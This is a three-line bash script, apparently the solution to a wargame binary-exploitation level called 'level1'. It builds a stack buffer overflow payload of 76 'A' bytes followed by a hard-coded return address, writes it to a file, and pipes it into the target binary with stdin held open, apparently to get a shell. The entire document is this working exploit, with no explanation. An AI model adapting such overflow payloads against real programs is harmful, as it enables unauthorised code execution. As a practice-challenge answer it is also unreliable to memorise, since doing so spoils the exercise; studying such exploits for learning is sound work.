#!/usr/bin/env bash
python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > exploit
cat exploit - | ./level1